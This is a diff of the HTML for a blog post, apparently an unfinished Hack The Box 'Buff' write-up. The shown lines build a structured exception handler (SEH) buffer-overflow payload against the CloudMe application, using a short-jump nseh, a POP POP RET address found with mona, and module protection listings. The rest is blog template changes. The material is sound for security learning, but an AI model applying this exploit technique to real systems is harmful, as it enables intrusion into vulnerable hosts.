+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2344</span> <span style="color:#ff79c6">*</span> <span style="color:#f1fa8c">&#39;A&#39;</span> <span style="color:#6272a4">#junk</span>
 </span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;BBBB&#34;</span> <span style="color:#6272a4">#nseh</span>
 </span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;CCCC&#34;</span> <span style="color:#6272a4">#seh</span>
 </span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">648</span> <span style="color:#ff79c6">*</span> <span style="color:#f1fa8c">&#34;D&#34;</span> <span style="color:#6272a4"># padding</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Now we want to replace nseh with <code>jump short (\xeb\x08)</code> and replace seh with <code>POP POP RET</code>.
+</span></span></code></pre></div><p>Now we want to replace nseh with <code>jump short (\xeb\x08)</code> and replace seh with <code>POP POP RET</code>.
 Mona will help us find the right addresses for nseh and seh:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>!<span style="color:#50fa7b">mona</span> seh
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>!<span style="color:#50fa7b">mona</span> seh
 </span></span><span style="display:flex;"><span>0<span style="color:#50fa7b">x6fe68fe7</span> : pop ebx <span style="color:#6272a4"># pop esi # ret 0x20 |  {PAGE_EXECUTE_READ} [libstdc++-6.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\User\AppData\Local\Programs\CloudMe\CloudMe\libstdc++-6.dll)
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2344</span> <span style="color:#ff79c6">*</span> <span style="color:#f1fa8c">&#39;A&#39;</span> <span style="color:#6272a4">#junk</span>
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2344</span> <span style="color:#ff79c6">*</span> <span style="color:#f1fa8c">&#39;A&#39;</span> <span style="color:#6272a4">#junk</span>
 </span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\xeb\x08\x90\x90</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#6272a4">#nseh</span>
 </span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\xe7\x8f\xe6\x6f</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#6272a4">#seh</span>
 </span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">648</span> <span style="color:#ff79c6">*</span> <span style="color:#f1fa8c">&#34;D&#34;</span> <span style="color:#6272a4"># padding</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">================================================================================</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">================================================================================</span>
 </span></span><span style="display:flex;"><span>  Output generated by mona.py v2.0, rev <span style="color:#bd93f9">613</span> - Immunity Debugger
 </span></span><span style="display:flex;"><span>  Corelan Team - https://www.corelan.be
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">================================================================================</span>
@@ -1050,9 +560,7 @@ Mona will help us find the right addresses for nseh and seh:</p>
 </span></span><span style="display:flex;"><span> 0x68a80000 | 0x69055000 | 0x005d5000 | False  | False   | False |  False   | False  | 5.9.0.0 <span style="color:#ff79c6">[</span>Qt5Core.dll<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">(</span>C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\U</span>ser<span style="color:#f1fa8c">\A</span>ppData<span style="color:#f1fa8c">\L</span>ocal<span style="color:#f1fa8c">\P</span>rograms<span style="color:#f1fa8c">\C</span>loudMe<span style="color:#f1fa8c">\C</span>loudMe<span style="color:#f1fa8c">\Q</span>t5Core.dll<span style="color:#ff79c6">)</span>
 </span></span><span style="display:flex;"><span> 0x74be0000 | 0x74d3a000 | 0x0015a000 | True   | True    | True  |  False   | True   | 10.0.18362.535 <span style="color:#ff79c6">[</span>gdi32full.dll<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">(</span>C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\S</span>ystem32<span style="color:#f1fa8c">\g</span>di32full.dll<span style="color:#ff79c6">)</span>
 </span></span><span style="display:flex;"><span> 0x74090000 | 0x74151000 | 0x000c1000 | True   | True    | True  |  False   | True   | 10.0.18362.387 <span style="color:#ff79c6">[</span>dxgi.dll<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">(</span>C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\d</span>xgi.dll<span style="color:#ff79c6">)</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>We find Qt5Core.dll has all security features set to False</p>
+</span></span></code></pre></div><p>We find Qt5Core.dll has all security features set to False</p>
 <h2 id="windows-docker-container">Windows docker container</h2>
 <p><a href="https://hub.docker.com/_/microsoft-windows-servercore">https://hub.docker.com/_/microsoft-windows-servercore</a></p>
 <p>docker pull mcr.microsoft.com/windows/servercore:10.0.17134.1305</p>
@@ -1061,6 +569,53 @@ Mona will help us find the right addresses for nseh and seh:</p>
     </article>
 
     <hr />
+
+    <div class="post-info">
+      
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://0xade1.github.io/devdraft/series/htb/">htb</a></span>
+        
+
+
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://0xade1.github.io/devdraft/categories/htb-windows/">htb-windows</a></span>
+        <span class="tag"><a href="https://0xade1.github.io/devdraft/categories/uncomplete/">uncomplete</a></span>
+        
+    </p>
+
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        1813 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2020-09-26 
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
       <div class="sharing-buttons">
         
 <a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2020%2f09%2fhtb-buff%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
@@ -1153,44 +708,34 @@ Mona will help us find the right addresses for nseh and seh:</p>
 </a>
 
       </div>
-          <hr />
 
     
-      <div class="pagination">
-        <div class="pagination__title">
-          <span class="pagination__title-h"></span>
-        </div>
+<div class="pagination">
+  
+  <hr />
+  <div class="pagination__buttons">
+    
+    <a href="https://0xade1.github.io/devdraft/posts/2020/09/htb-shocker/" class="button next">
+      <span class="button__icon">←</span>
+      <span class="button__text">HTB - Shocker</span>
+    </a>
+     
+    <a href="https://0xade1.github.io/devdraft/posts/2020/09/htb-admirer/" class="button previous">
+      <span class="button__text">HTB - Admirer</span>
+      <span class="button__icon">→</span>
+    </a>
+    
+  </div>
+  <hr />
+</div>
 
-        <div class="pagination__buttons">
-          
-            <a href="https://0xade1.github.io/devdraft/posts/2020/09/htb-admirer/" class="button previous">
-                <span class="button__icon">←</span>
-                <span class="button__text">HTB - Admirer</span>
-            </a>
-          
 
-          
-            <a href="https://0xade1.github.io/devdraft/posts/2020/09/htb-shocker/" class="button next">
-                <span class="button__text">HTB - Shocker</span>
-                <span class="button__icon">→</span>
-            </a>
-          
-        </div>
-      </div>
+
     
 
-      <hr />
+    
 
-        
-
-
-
-
-
-
-
-
-
+    
 
   </main>
 
@@ -1198,41 +743,45 @@ Mona will help us find the right addresses for nseh and seh:</p>
 
             
                 <footer class="footer">
+    
     <div class="footer__inner">
         <div class="footer__content">
             <span>&copy; 2023</span>
-            
+            <span><a href="https://0xade1.github.io/devdraft"></a></span>
+            <span></span>
             <span><a href="https://0xade1.github.io/devdraft/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
         </div>
     </div>
+    
+    
     <div class="footer__inner">
         <div class="footer__content">
-            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
-            <span>Made with &#10084;</span>
-          </div>
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span><span>Made with &#10084;</span>
+        </div>
     </div>
+    
 </footer>
 
             
         </div>
 
-        
+    
 
 
 
-<script type="text/javascript" src="https://0xade1.github.io/devdraft/bundle.min.7015b843bafc394b6094818242f153559f5ca94b331b9faaf6132652c59619aefe60ae36e1637f7ee14fd953892639f466c25095c36d42203a1c195313e93212.js" integrity="sha512-cBW4Q7r8OUtglIGCQvFTVZ9cqUszG5&#43;q9hMmUsWWGa7&#43;YK424WN/fuFP2VOJJjn0ZsJQlcNtQiA6HBlTE&#43;kyEg=="></script>
+<script type="text/javascript" src="https://0xade1.github.io/devdraft/bundle.min.4037dc94fd1565c4fd3354e2b4a2d1ff11842c906242435350b4d2d8d6e8b7890da46c0a865173f543a6161c1f4d1c94147f1b907db36489fc2bf5e20d4af75c.js" integrity="sha512-QDfclP0VZcT9M1TitKLR/xGELJBiQkNTULTS2Nbot4kNpGwKhlFz9UOmFhwfTRyUFH8bkH2zZIn8K/XiDUr3XA=="></script>
 
 
 
 
-
- <div id="fastSearch">
-   <ul id="searchResults">
-   </ul>
-   <input id="searchInput" tabindex="0">
- </div>
- <script src="https://cdn.jsdelivr.net/npm/fuse.js@6.6.2/dist/fuse.min.js"></script> 
- <script src="https://0xade1.github.io/devdraft/js/fastsearch.js"></script>
-
-    </body>
+    
+    <div id="fastSearch">
+      <ul id="searchResults"></ul>
+      <input id="searchInput" tabindex="0" />
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/fuse.js@6.6.2/dist/fuse.min.js"></script>
+    
+    <script src="https://0xade1.github.io/devdraft/js/fastsearch.js"></script>
+  </body>
 </html>
